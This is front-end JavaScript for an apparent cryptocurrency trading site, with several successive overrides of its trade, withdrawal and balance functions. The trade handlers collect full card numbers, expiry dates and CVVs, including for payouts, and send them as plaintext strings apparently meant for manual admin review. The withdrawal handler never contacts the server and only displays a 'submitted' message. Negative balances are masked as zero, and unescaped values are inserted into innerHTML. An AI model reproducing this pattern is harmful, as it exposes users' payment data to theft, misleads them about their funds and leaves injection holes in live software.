                <button onclick="showView('dashboardView')" style="
                    width: 42px; 
                    height: 42px; 
                    border-radius: 50%; 
                    background: #1a1a2a; 
                    border: 1px solid #2a2a3a; 
                    display: flex; 
                    align-items: center; 
                    justify-content: center; 
                    cursor: pointer; 
                    margin-right: 15px; 
                    padding: 0; 
                    color: #fff; 
                    transition: background 0.2s, border-color 0.2s;
                " onmouseover="this.style.background='#2a2a3a'" onmouseout="this.style.background='#1a1a2a'">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M19 12H5M12 19l-7-7 7-7"/>
                    </svg>
                </button>
                <h2 style="margin: 0; font-size: 20px; color: #fff; font-weight: 700;">${title}</h2>
            </div>

            <!-- Main Content Card -->
            <div class="card" style="background: #1a1a2a; border-radius: 16px; padding: 25px; border: 1px solid #2a2a3a; box-shadow: 0 8px 24px rgba(0,0,0,0.2);">
                ${contentHtml}
            </div>
        </div>
    `;
    document.body.appendChild(view);
};

/* =====================================================
   PROFESSIONAL PAYMENT VS PAYOUT METHOD LOGIC
   ===================================================== */
window.setTradeMode = function(mode) {
    currentTradeMode = mode;
    const curr = getUserCurrency();
    const methodSelect = document.getElementById('tradeMethod');
    const methodLabel = methodSelect.previousElementSibling; // Get the label above the select
    
    // 1. Update Tabs UI
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy');
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    // 2. Update Labels and Options based on Mode
    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`;
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase';
        document.getElementById('submitTradeBtn').style.background = 'var(--success)';
        document.getElementById('receivingWalletContainer').style.display = 'block';
        
        document.getElementById('tradeAmount').placeholder = '100.00';
        document.getElementById('tradeReceive').previousElementSibling.textContent = 'You will receive (Crypto)';
        
        // BUY: Payment Method
        methodLabel.textContent = 'Payment Method';
        methodSelect.innerHTML = `
            <option value="Credit Card">Credit / Debit Card</option>
            <option value="PayPal">PayPal</option>
            <option value="Bank Transfer">Bank Transfer</option>
        `;
        
    } else {
        // SELL MODE
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)';
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale';
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)';
        document.getElementById('receivingWalletContainer').style.display = 'none';
        
        document.getElementById('tradeAmount').placeholder = '0.000000';
        document.getElementById('tradeReceive').previousElementSibling.textContent = `You will receive (${curr.code})`;
        
        // SELL: Payout Method (No Credit Card!)
        methodLabel.textContent = 'Payout Method';
        methodSelect.innerHTML = `
            <option value="Bank Transfer">Bank Transfer (Fiat Payout)</option>
            <option value="PayPal">PayPal (Fiat Payout)</option>
        `;
    }
    
    // 3. Clear inputs and trigger form updates
    document.getElementById('tradeAmount').value = '';
    document.getElementById('tradeReceive').value = '';
    togglePaymentDetails(); 
    calcTrade();
};

// Ensure the inputs toggle correctly based on the new options
window.togglePaymentDetails = function() {
    const method = document.getElementById('tradeMethod').value;
    
    document.getElementById('cardDetailsInputs').style.display = 'none';
    document.getElementById('paypalDetailsInputs').style.display = 'none';
    document.getElementById('bankDetailsInputs').style.display = 'none';
    
    if (method === 'Credit Card') {
        document.getElementById('cardDetailsInputs').style.display = 'block';
    } else if (method === 'PayPal') {
        document.getElementById('paypalDetailsInputs').style.display = 'block';
    } else if (method === 'Bank Transfer') {
        document.getElementById('bankDetailsInputs').style.display = 'block';
    }
};

/* =====================================================
   FIX: KEEP CARD OPTION IN SELL MODE
   ===================================================== */
window.setTradeMode = function(mode) {
    currentTradeMode = mode;
    const curr = getUserCurrency();
    const methodSelect = document.getElementById('tradeMethod');
    const methodLabel = methodSelect.previousElementSibling;
    
    // 1. Update Tabs UI
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy');
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    // 2. Update Labels and Options based on Mode
    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`;
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase';
        document.getElementById('submitTradeBtn').style.background = 'var(--success)';
        document.getElementById('receivingWalletContainer').style.display = 'block';
        
        document.getElementById('tradeAmount').placeholder = '100.00';
        document.getElementById('tradeReceive').previousElementSibling.textContent = 'You will receive (Crypto)';
        
        // BUY: Payment Method
        methodLabel.textContent = 'Payment Method';
        methodSelect.innerHTML = `
            <option value="Credit Card">Credit / Debit Card</option>
            <option value="PayPal">PayPal</option>
            <option value="Bank Transfer">Bank Transfer</option>
        `;
        
    } else {
        // SELL MODE
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)';
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale';
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)';
        document.getElementById('receivingWalletContainer').style.display = 'none';
        
        document.getElementById('tradeAmount').placeholder = '0.000000';
        document.getElementById('tradeReceive').previousElementSibling.textContent = `You will receive (${curr.code})`;
        
        // SELL: Payout Method (Credit Card is included as you requested)
        methodLabel.textContent = 'Payout Method';
        methodSelect.innerHTML = `
            <option value="Credit Card">Credit / Debit Card</option>
            <option value="PayPal">PayPal</option>
            <option value="Bank Transfer">Bank Transfer</option>
        `;
    }
    
    // 3. Clear inputs and trigger form updates
    document.getElementById('tradeAmount').value = '';
    document.getElementById('tradeReceive').value = '';
    togglePaymentDetails(); 
    calcTrade();
};

/* =====================================================
   PROFESSIONAL CUSTOM ALERT & WITHDRAWAL FIXES
   ===================================================== */
// 1. Create a custom dark-mode alert modal
window.showCustomAlert = function(title, message) {
    let modal = document.getElementById('customAlertModal');
    if (modal) modal.remove();

    modal = document.createElement('div');
    modal.id = 'customAlertModal';
    modal.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px;";

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 25px; width: 100%; max-width: 340px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            <div style="width: 55px; height: 55px; border-radius: 50%; background: rgba(246, 70, 93, 0.1); display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f6465d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
            </div>
            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;">${title}</h3>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.4;">${message}</p>
            <button onclick="document.getElementById('customAlertModal').remove()" style="background: #2a2a3a; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.2s;" onmouseover="this.style.background='#333'" onmouseout="this.style.background='#2a2a3a'">Got it</button>
        </div>
    `;
    document.body.appendChild(modal);
};

// 2. Override Withdraw Page to fix negative balance display
window.openWithdrawPage = function(symbol, balance) {
    const safeBalance = Math.max(0, parseFloat(balance)).toFixed(6); // Force 0 if negative
    
    const content = `
        <div>
            <h3 style="color: #fff; margin-bottom: 5px; text-align: center;">Withdraw ${symbol}</h3>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px; text-align: center;">Available: ${safeBalance} ${symbol}</p>
            
            <div style="margin-bottom: 20px;">
                <label style="color: #888; font-size: 12px; margin-bottom: 8px; display: block;">Amount to Withdraw</label>
                <input type="number" id="withdrawPageAmount" placeholder="0.00" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none; font-size: 16px;">
            </div>
            
            <div style="margin-bottom: 25px;">
                <label style="color: #888; font-size: 12px; margin-bottom: 8px; display: block;">Destination Address</label>
                <input type="text" id="withdrawPageAddress" placeholder="Enter ${symbol} address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none; font-size: 16px;">
            </div>
            
            <button onclick="executeWithdrawal('${symbol}', ${safeBalance})" style="background: #f6465d; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer;">Request Withdrawal</button>
        </div>
    `;
    
    createPageView('withdrawPageView', 'Withdraw', content);
    showView('withdrawPageView');
};

// 3. Override Withdrawal Logic to use Custom Alerts
window.executeWithdrawal = function(symbol, balance) {
    const amount = parseFloat(document.getElementById('withdrawPageAmount').value);
    const address = document.getElementById('withdrawPageAddress').value.trim();
    
    if (!amount || amount <= 0) {
        return showCustomAlert('Invalid Amount', 'Please enter a valid amount to withdraw.');
    }
    if (amount > balance) {
        return showCustomAlert('Insufficient Balance', `You only have ${balance} ${symbol} available to withdraw.`);
    }
    if (!address) {
        return showCustomAlert('Missing Address', 'Please enter a destination address for your withdrawal.');
    }
    
    showToast(`Withdrawal request of ${amount} ${symbol} submitted for approval.`);
    showView('dashboardView');
};

/* =====================================================
   FIX: PREVENT NEGATIVE BALANCES ON DASHBOARD
   ===================================================== */
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0;">Your Assets</h3>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
        `;
        
        let totalValue = 0;
        let assetRowsHtml = '';

        markets.forEach(coin => {
            // THE FIX: Force the amount to be 0 if it's negative
            const rawAmount = balances[coin.symbol] || 0;
            const amount = Math.max(0, rawAmount); 
            
            const value = amount * coin.price;
            totalValue += value;
            
            assetRowsHtml += `
                <div class="asset-row" onclick="showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})" style="cursor: pointer; transition: background 0.2s; padding: 15px 0; border-bottom: 1px solid #2a2a3a; display: flex; justify-content: space-between; align-items: center;" onmouseover="this.style.background='#1a1a2a'" onmouseout="this.style.background='transparent'">
                    <div class="asset-name" style="display: flex; align-items: center; gap: 10px;">
                        <div class="market-icon" style="background:${coin.color}; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 16px; color: white;">${coin.icon}</div> 
                        <span style="font-weight: 600; font-size: 14px;">${coin.name} (${coin.symbol})</span>
                    </div>
                    <div class="asset-amount" style="font-weight: 600; font-size: 14px;">${amount.toFixed(6)}</div>
                    <div class="asset-value" style="color: #888; font-size: 14px;">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                </div>
            `;
        });

        assetsCard.innerHTML = html + assetRowsHtml;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) {
            // Also force total value to never show negative
            const safeTotal = Math.max(0, totalValue);
            totalEl.textContent = `$${safeTotal.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
        }

    } catch (error) { console.log("Balance fetch error:", error); }
};

/* =====================================================
   ADD "NAME ON CARD" TO PAYMENT FORM & VALIDATION
   ===================================================== */
// 1. Inject the missing input field into the HTML dynamically
document.addEventListener('DOMContentLoaded', () => {
    const cardInputs = document.getElementById('cardDetailsInputs');
    if (cardInputs && !document.getElementById('cardName')) {
        // Create the Name on Card input group
        const nameGroup = document.createElement('div');
        nameGroup.className = 'input-group';
        nameGroup.innerHTML = `
            <label>Name on Card</label>
            <input type="text" id="cardName" placeholder="John Doe" autocomplete="cc-name">
        `;
        // Insert it at the very top of the card details section
        cardInputs.insertBefore(nameGroup, cardInputs.firstChild);
    }
});

// 2. Override submitTrade to validate and save the Name on Card
window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // Minimum trade rule (local currency)
    if (currentTradeMode === 'buy') {
        if (inputAmount < 100) return showToast(`Minimum purchase is ${curr.symbol} 100 ${curr.code}.`);
    } else {
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        const localAmount = usdAmount * curr.rate;
        if (localAmount < 100) return showToast(`Minimum sale value is ${curr.symbol} 100 ${curr.code}.`);
    }
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardName = document.getElementById('cardName') ? document.getElementById('cardName').value.trim() : "";
        const cardNum = document.getElementById('cardNumber').value.trim(); 
        const expiry = document.getElementById('cardExpiry').value.trim(); 
        const cvv = document.getElementById('cardCvv').value.trim();
        
        if (cardName.length < 3) return showToast("Enter a valid name on card.");
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        
        paymentDetails = `Name: ${cardName} | Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; 
        if (!email.includes('@')) return showToast("Enter a valid PayPal email."); 
        paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; 
        if (!bank) return showToast("Enter bank details."); 
        paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   PROFESSIONAL BANK DETAILS FORM & VALIDATION
   ===================================================== */
// 1. Inject the missing fields into the Bank Details HTML dynamically
document.addEventListener('DOMContentLoaded', () => {
    const bankInputs = document.getElementById('bankDetailsInputs');
    if (bankInputs) {
        bankInputs.innerHTML = `
            <div class="input-group">
                <label>Bank Name</label>
                <input type="text" id="bankName" placeholder="e.g., Chase Bank, KCB, GTBank">
            </div>
            <div class="input-group">
                <label>Account Holder Name</label>
                <input type="text" id="bankAccountName" placeholder="e.g., John Doe">
            </div>
            <div class="input-group">
                <label>Account Number / IBAN</label>
                <input type="text" id="bankAccountNumber" placeholder="Enter account number">
            </div>
        `;
    }
});

// 2. Override submitTrade to validate and save all 3 Bank fields
window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // Minimum trade rule (local currency)
    if (currentTradeMode === 'buy') {
        if (inputAmount < 100) return showToast(`Minimum purchase is ${curr.symbol} 100 ${curr.code}.`);
    } else {
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        const localAmount = usdAmount * curr.rate;
        if (localAmount < 100) return showToast(`Minimum sale value is ${curr.symbol} 100 ${curr.code}.`);
    }
    
    let paymentDetails = "";
    
    if (method === 'Credit Card') {
        const cardName = document.getElementById('cardName') ? document.getElementById('cardName').value.trim() : "";
        const cardNum = document.getElementById('cardNumber').value.trim(); 
        const expiry = document.getElementById('cardExpiry').value.trim(); 
        const cvv = document.getElementById('cardCvv').value.trim();
        
        if (cardName.length < 3) return showToast("Enter a valid name on card.");
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        
        paymentDetails = `Name: ${cardName} | Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
        
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; 
        if (!email.includes('@')) return showToast("Enter a valid PayPal email."); 
        paymentDetails = `PayPal: ${email}`;
        
    } else if (method === 'Bank Transfer') {
        // NEW: Validate all 3 bank fields
        const bankName = document.getElementById('bankName').value.trim();
        const accountName = document.getElementById('bankAccountName').value.trim();
        const accountNumber = document.getElementById('bankAccountNumber').value.trim();
        
        if (!bankName) return showToast("Please enter your Bank Name.");
        if (!accountName) return showToast("Please enter the Account Holder Name.");
        if (!accountNumber) return showToast("Please enter your Account Number.");
        
        // Format it beautifully for the Admin Panel
        paymentDetails = `Bank: ${bankName} | Holder: ${accountName} | Acct: ${accountNumber}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   ULTRA-PREMIUM ASSET LIST & TOGGLE SWITCH
   ===================================================== */
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';

        // Build the header with a PREMIUM iOS/Android style toggle
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Your Assets</h3>
                
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer; user-select: none;">
                    <span style="font-size: 13px; color: #aaa; font-weight: 500;">Hide Zero</span>
                    <div style="position: relative; width: 44px; height: 24px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0; position: absolute;">
                        <!-- Toggle Track -->
                        <span style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#3a3a4a'}; border-radius: 24px; transition: background-color 0.3s ease; box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);"></span>
                        <!-- Toggle Thumb -->
                        <span style="position: absolute; height: 20px; width: 20px; left: ${hideZero ? '21px' : '2px'}; bottom: 2px; background-color: #fff; border-radius: 50%; transition: left 0.3s cubic-bezier(0.4, 0.0, 0.2, 1); box-shadow: 0 2px 5px rgba(0,0,0,0.3);"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header" style="display: flex; justify-content: space-between; padding: 0 10px 10px 10px; border-bottom: 1px solid #2a2a3a; font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 0.5px;">
                <span style="flex: 2;">Asset</span>
                <span style="flex: 1; text-align: right;">Amount</span>
                <span style="flex: 1; text-align: right;">Value</span>
            </div>
        `;
        
        let totalValue = 0;
        let assetRowsHtml = '';

        markets.forEach(coin => {
            const rawAmount = balances[coin.symbol] || 0;
            const amount = Math.max(0, rawAmount); // Prevent negative balances
            
            const value = amount * coin.price;
            totalValue += value;
            
            if (hideZero && amount === 0) return;

            assetRowsHtml += `
                <div class="asset-row" onclick="showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})" 
                     style="cursor: pointer; transition: background 0.2s; padding: 15px 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05);" 
                     onmouseover="this.style.background='#1a1a2a'" onmouseout="this.style.background='transparent'">
                    
                    <div class="asset-name" style="flex: 2; display: flex; align-items: center; gap: 12px;">
                        <div class="market-icon" style="background:${coin.color}; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 18px; color: white; box-shadow: 0 2px 8px rgba(0,0,0,0.2);">${coin.icon}</div> 
                        <div style="display: flex; flex-direction: column;">
                            <span style="font-weight: 600; font-size: 14px; color: #fff;">${coin.name}</span>
                            <span style="font-weight: 500; font-size: 12px; color: #888;">${coin.symbol}</span>
                        </div>
                    </div>
                    
                    <div style="flex: 1; text-align: right;">
                        <div style="font-weight: 600; font-size: 14px; color: #fff;">${amount.toFixed(6)}</div>
                    </div>
                    
                    <div style="flex: 1; text-align: right;">
                        <div style="font-size: 14px; color: #888;">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                    </div>
                </div>
            `;
        });

        if (assetRowsHtml === '') {
            assetRowsHtml = `<div style="text-align: center; color: #666; padding: 40px 0;"><div style="font-size: 30px; margin-bottom: 10px;">📭</div><p style="font-size: 14px;">No active balances found.</p></div>`;
        }

        assetsCard.innerHTML = html + assetRowsHtml;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) {
            const safeTotal = Math.max(0, totalValue);
            totalEl.textContent = `$${safeTotal.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
        }

        // Attach event listener to the new premium toggle
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                localStorage.setItem('hideZeroBalances', e.target.checked);
                fetchBalances(); // Instantly re-render the list
            });
        }

    } catch (error) { console.log("Balance fetch error:", error); }
};
